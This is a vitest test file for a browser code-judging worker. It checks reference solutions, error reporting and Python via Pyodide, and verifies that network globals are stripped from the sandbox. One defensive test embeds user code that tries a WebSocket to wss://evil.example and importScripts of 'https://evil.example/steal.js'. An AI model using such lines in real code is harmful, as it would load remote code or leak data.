/**
 * Runs the real public/judge-worker.js inside a vm context (standing in for
 * a Web Worker global) behind the real JudgeClient, and checks every
 * problem's reference solutions end to end: worker executes, main thread
 * compares. Python uses the local pyodide npm package (no network).
 */
import fs from "node:fs";
import { createRequire } from "node:module";
import path from "node:path";
import { fileURLToPath } from "node:url";
import vm from "node:vm";
import { beforeAll, describe, expect, it } from "vitest";
import { listProblems } from "@synapse/core/content";
import { PYODIDE_INDEX_URL, PYTHON_HARNESS } from "@synapse/core/judge";
import { JudgeClient, type WorkerLike } from "./client";
import { judgeCode } from "./judge";
import type { WorkerRequest } from "./protocol";

const here = path.dirname(fileURLToPath(import.meta.url));
const WORKER_SOURCE = fs.readFileSync(path.join(here, "..", "..", "public", "judge-worker.js"), "utf8");

interface PyodideLike {
  runPython(code: string): unknown;
  globals: { get(name: string): unknown };
}

type LoadPyodide = (options: { indexURL: string; stdout?: (line: string) => void; stderr?: (line: string) => void }) => Promise<PyodideLike>;

let sharedPyodide: Promise<PyodideLike | null> | undefined;
let stdoutSink: ((line: string) => void) | undefined;

/** One Node Pyodide instance shared by every simulated worker (loading takes seconds). */
function nodePyodide(): Promise<PyodideLike | null> {
  sharedPyodide ??= (async () => {
    try {
      const { loadPyodide } = (await import("pyodide")) as unknown as { loadPyodide: LoadPyodide };
      const packageDir = path.dirname(createRequire(import.meta.url).resolve("pyodide/package.json"));
      return await loadPyodide({ indexURL: `${packageDir}${path.sep}`, stdout: (line) => stdoutSink?.(line) });
    } catch (error) {
      console.warn(`[synapse] Pyodide unavailable, skipping Python worker checks: ${(error as Error).message}`);
      return null;
    }
  })();
  return sharedPyodide;
}

/** Network-capable globals of a real worker scope (plus importScripts, which the vm worker always has). */
const NETWORK_GLOBALS = ["fetch", "XMLHttpRequest", "WebSocket", "EventSource", "WebTransport", "Worker", "BroadcastChannel", "caches"];

interface VmWorkerOptions {
  importedScripts?: string[];
  /** Installs recording stand-ins for NETWORK_GLOBALS; every call that gets through lands here. */
  networkCalls?: string[];
  /** Receives each worker's global scope so tests can inspect it. */
  scopes?: Record<string, unknown>[];
}

/** A WorkerLike whose global scope is a fresh vm context running judge-worker.js. */
function createVmWorker(options: VmWorkerOptions = {}): WorkerLike {
  let terminated = false;
  const context: Record<string, unknown> = {};
  const worker: WorkerLike = {
    onmessage: null,
    onerror: null,
    postMessage(message: WorkerRequest) {
      const data = structuredClone(message);
      setTimeout(() => {
        if (!terminated) (context.onmessage as ((event: { data: unknown }) => void) | undefined)?.({ data });
      }, 0);
    },
    terminate() {
      terminated = true;
    },
  };
  context.self = context;
  context.postMessage = (data: unknown) => {
    const copy = JSON.parse(JSON.stringify(data)) as unknown; // structured-clone stand-in across realms
    setTimeout(() => {
      if (!terminated) worker.onmessage?.({ data: copy });
    }, 0);
  };
  context.importScripts = (...urls: string[]) => {
    options.importedScripts?.push(...urls);
    context.loadPyodide = async (config: { stdout?: (line: string) => void }) => {
      const pyodide = await nodePyodide();
      if (!pyodide) throw new Error("pyodide unavailable");
      stdoutSink = config.stdout;
      return pyodide;
    };
  };
  const calls = options.networkCalls;
  if (calls) {
    for (const name of NETWORK_GLOBALS) {
      context[name] =
        name === "caches"
          ? { open: (cacheName: unknown) => calls.push(`caches.open(${String(cacheName)})`) }
          : function (target: unknown) {
              calls.push(`${name}(${String(target)})`);
            };
    }
  }
  options.scopes?.push(context);
  vm.createContext(context);
  vm.runInContext(WORKER_SOURCE, context, { filename: "judge-worker.js" });
  return worker;
}

const PROBLEMS = listProblems();

describe("judge-worker.js (JavaScript)", () => {
  const client = () => new JudgeClient({ createWorker: () => createVmWorker() });

  it.each(PROBLEMS.map((problem) => [problem.id, problem] as const))("accepts the JS reference for %s", async (_id, problem) => {
    const outcome = await judgeCode(client(), {
      stage: problem.stages.code,
      mode: "submit",
      language: "javascript",
      code: problem.stages.code.reference.javascript,
    });
    expect(outcome.ok).toBe(true);
    if (!outcome.ok) return;
    expect(outcome.report.cases.filter((c) => !c.passed)).toEqual([]);
    expect(outcome.report.status).toBe("accepted");
  });

  it.each(PROBLEMS.map((problem) => [problem.id, problem] as const))("rejects the JS starter for %s", async (_id, problem) => {
    const outcome = await judgeCode(client(), {
      stage: problem.stages.code,
      mode: "submit",
      language: "javascript",
      code: problem.stages.code.starter.javascript,
    });
    expect(outcome.ok && outcome.report.status).not.toBe("accepted");
  });

  const stage = {
    functionName: "twice",
    compare: "exact" as const,
    tests: [
      { args: [2], expected: 4 },
      { args: [5], expected: 10 },
    ],
  };

  it("captures console output per test", async () => {
    const code = "function twice(n) { console.log('n is', n, { n }); return n * 2; }";
    const outcome = await judgeCode(client(), { stage, mode: "run", language: "javascript", code });
    expect(outcome.ok && outcome.report.status).toBe("accepted");
    if (outcome.ok) expect(outcome.report.cases.map((c) => c.logs)).toEqual([['n is 2 {"n":2}'], ['n is 5 {"n":5}']]);
  });

  it("reports syntax errors as compile errors", async () => {
    const outcome = await judgeCode(client(), { stage, mode: "run", language: "javascript", code: "function twice(n) { return n * ; }" });
    expect(outcome.ok && outcome.report.status).toBe("compile_error");
    if (outcome.ok) expect(outcome.report.message).toMatch(/^SyntaxError/);
  });

  it("explains a missing function", async () => {
    const outcome = await judgeCode(client(), { stage, mode: "run", language: "javascript", code: "function double(n) { return n * 2; }" });
    expect(outcome.ok && outcome.report.status).toBe("runtime_error");
    if (outcome.ok) expect(outcome.report.message).toContain("Define a function named twice");
  });

  it("isolates per-test exceptions and wrong answers", async () => {
    const code = "function twice(n) { if (n === 5) throw new TypeError('boom'); return n * 3; }";
    const outcome = await judgeCode(client(), { stage, mode: "run", language: "javascript", code });
    expect(outcome.ok).toBe(true);
    if (!outcome.ok) return;
    expect(outcome.report.status).toBe("runtime_error");
    expect(outcome.report.cases[0]).toMatchObject({ passed: false, actual: 6 });
    expect(outcome.report.cases[1]).toMatchObject({ passed: false, error: "TypeError: boom" });
  });

  it("accepts arrow functions and const declarations", async () => {
    const outcome = await judgeCode(client(), { stage, mode: "run", language: "javascript", code: "const twice = (n) => n * 2;" });
    expect(outcome.ok && outcome.report.status).toBe("accepted");
  });

  it("strips the network globals before user code runs (defense in depth behind the worker CSP)", async () => {
    const calls: string[] = [];
    const scopes: Record<string, unknown>[] = [];
    const locked = new JudgeClient({ createWorker: () => createVmWorker({ networkCalls: calls, importedScripts: calls, scopes }) });
    const names = JSON.stringify([...NETWORK_GLOBALS, "importScripts"]);
    const code = `function twice(n) {
  const attempts = [
    () => fetch("/api/link"),
    () => new XMLHttpRequest(),
    () => new WebSocket("wss://evil.example"),
    () => new EventSource("/api/stats"),
    () => importScripts("https://evil.example/steal.js"),
    () => new Worker("data:text/javascript,0"),
    () => caches.open("loot"),
  ];
  for (const attempt of attempts) {
    try { attempt(); } catch {}
  }
  const reachable = ${names}.filter((name) => typeof globalThis[name] !== "undefined" || typeof self[name] !== "undefined");
  if (reachable.length > 0) throw new Error("reachable: " + reachable.join(", "));
  return n * 2;
}`;
    const outcome = await judgeCode(locked, { stage, mode: "run", language: "javascript", code });
    expect(outcome.ok && outcome.report.cases.map((c) => c.error ?? null)).toEqual([null, null]);
    expect(outcome.ok && outcome.report.status).toBe("accepted");
    expect(calls).toEqual([]);
    expect(scopes.length).toBeGreaterThan(0);
    for (const scope of scopes) expect([...NETWORK_GLOBALS, "importScripts"].filter((name) => name in scope)).toEqual([]);
  });
});

describe("judge-worker.js (Python via Pyodide)", () => {
  let available = false;
  const imported: string[] = [];
  const networkCalls: string[] = [];
  const scopes: Record<string, unknown>[] = [];
  let client: JudgeClient;

  beforeAll(async () => {
    available = (await nodePyodide()) !== null;
    // One warm worker for the whole suite, exactly like the browser.
    client = new JudgeClient({ createWorker: () => createVmWorker({ importedScripts: imported, networkCalls, scopes }) });
  }, 120_000);

  it("loads pyodide.js from the pinned CDN folder with core's harness", async () => {
    if (!available) return;
    const outcome = await judgeCode(client, {
      stage: { functionName: "twice", compare: "exact", tests: [{ args: [2], expected: 4 }] },
      mode: "run",
      language: "python",
      code: "print('loading module')\ndef twice(n):\n    print('n is', n)\n    return n * 2\n",
    });
    expect(imported).toEqual([`${PYODIDE_INDEX_URL}pyodide.js`]);
    expect(PYTHON_HARNESS).toContain("synapse_run_tests");
    expect(outcome.ok && outcome.report.status).toBe("accepted");
    if (!outcome.ok) return;
    expect(outcome.report.cases[0]!.logs).toEqual(["n is 2"]);
    expect(client.pythonStatus).toBe("ready");
  }, 60_000);

  it("strips the network globals once Pyodide is ready, and keeps judging", async () => {
    if (!available) return;
    const outcome = await judgeCode(client, {
      stage: { functionName: "twice", compare: "exact", tests: [{ args: [3], expected: 6 }] },
      mode: "run",
      language: "python",
      code: "def twice(n):\n    return n * 2\n",
    });
    expect(outcome.ok && outcome.report.status).toBe("accepted");
    expect(scopes).toHaveLength(1);
    expect([...NETWORK_GLOBALS, "importScripts"].filter((name) => name in scopes[0]!)).toEqual([]);
    expect(scopes[0]!.loadPyodide).toBeTypeOf("function");
    expect(networkCalls).toEqual([]);
  }, 60_000);

  it("accepts every Python reference solution", async () => {
    if (!available) return;
    for (const problem of PROBLEMS) {
      const outcome = await judgeCode(client, {
        stage: problem.stages.code,
        mode: "submit",
        language: "python",
        code: problem.stages.code.reference.python,
      });
      expect(outcome.ok, problem.id).toBe(true);
      if (!outcome.ok) continue;
      expect({ id: problem.id, failures: outcome.report.cases.filter((c) => !c.passed) }).toEqual({ id: problem.id, failures: [] });
    }
  }, 60_000);

  it("reports Python syntax errors with a line number", async () => {
    if (!available) return;
    const outcome = await judgeCode(client, {
      stage: { functionName: "twice", compare: "exact", tests: [{ args: [2], expected: 4 }] },
      mode: "run",
      language: "python",
      code: "def twice(n)\n    return n * 2\n",
    });
    expect(outcome.ok && outcome.report.status).toBe("compile_error");
    if (outcome.ok) expect(outcome.report.message).toMatch(/SyntaxError.*line 1/);
  }, 30_000);
});
